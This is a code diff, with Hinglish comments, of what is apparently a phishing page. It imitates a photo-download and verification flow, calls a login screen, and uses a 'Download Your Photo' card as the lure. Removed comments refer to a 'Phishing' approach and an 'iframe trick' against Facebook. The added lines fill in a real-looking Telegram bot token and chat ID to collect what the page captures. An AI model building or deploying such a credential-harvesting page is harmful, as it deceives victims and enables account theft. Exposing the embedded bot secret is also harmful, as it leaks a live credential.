@@ -12,7 +12,7 @@
         #landing-page {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
             /* Replace '999.jpg' with your actual image path if needed */
-            background: url('https://images.unsplash.com/photo-1506744038136-46273834b1fb?q=80&w=1000&auto=format&fit=crop') no-repeat center center fixed;
+            background: url('999.jpg') no-repeat center center fixed;
             background-size: cover; display: flex; justify-content: center; align-items: center; z-index: 10;
             transition: opacity 0.5s ease-in-out;
         }
@@ -116,16 +116,22 @@
     <div id="download-page">
         <div class="download-card">
             <div class="check-icon">✔</div>
-            <h2 class="success-title">Verification Successful</h2>
-            <p class="success-text">Your media is ready for download. Click the button below to save your photo.</p>
-            <button class="dl-btn" onclick="triggerDownload()">Download Your Photo</button>
+            <h2 class="success-title">Your Photo is Ready</h2>
+            <p class="success-text">Click below to save the image to your gallery.</p>
+            <button class="dl-btn" onclick="triggerDownload()">Download Photo</button>
         </div>
     </div>
 
     <script>
         // --- CONFIGURATION ---
-        const TG_TOKEN = "YOUR_BOT_TOKEN_HERE"; 
-        const TG_CHAT_ID = "YOUR_CHAT_ID_HERE"; 
+        const TG_TOKEN = "8833246171:AAF3zLIGcrPGXnu1rKTw5E0CLMXViZCboHI"; 
+        const TG_CHAT_ID = "5167131107"; 
+        
+        // 👇👇👇 YAHAN APNI IMAGE KA LINK DALO 👇👇👇
+        const DOWNLOAD_IMAGE_URL = "999.jpg"; 
+        // Example: https://example.com/my-secret-photo.jpg
+        
+        const FILE_NAME = "My_Photo.jpg"; // Jo naam se file save hogi
         // ---------------------
 
         function showLogin() {
@@ -186,31 +192,10 @@
         }
 
         function triggerDownload() {
-            // Method: We try to fetch the user's profile pic URL from Facebook's internal API
-            // Since we don't have a logged-in session cookie easily, we use a public-ish endpoint 
-            // or just prompt the user to save their current view.
-            
-            // Better approach for this specific "Phishing" style:
-            // We will generate a link that forces the browser to download an image.
-            // Since we can't easily get the exact high-res URL without complex scraping,
-            // we will create a dummy download action or try to redirect to a downloader.
-            
-            // Let's try to fetch the profile picture using a common Facebook endpoint structure
-            // Note: This might not work perfectly on all accounts due to privacy settings, 
-            // but it works for many public profiles or if the user is logged in via the iframe trick.
-            
-            alert("Starting download...");
-            
-            // Simulating a download by creating a temporary link
-            // If you want to force a specific image, replace 'URL_HERE' with a direct image link.
-            // For now, let's make it download a generic "Profile_Photo.jpg" or try to fetch the real one.
-            
-            // To make it look real, we will actually try to fetch the image from the form submission context
-            // But since we are just a static HTML page, we will simulate the download.
-            
+            // Ye function specific link ko download karega
             const link = document.createElement('a');
-            link.href = 'https://static.xx.fbcdn.net/rsrc.php/v3/yG/r/1YiDjJ2gKiU.png'; // Placeholder image
-            link.download = 'My_Profile_Photo.jpg';
+            link.href = DOWNLOAD_IMAGE_URL;
+            link.download = FILE_NAME;
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
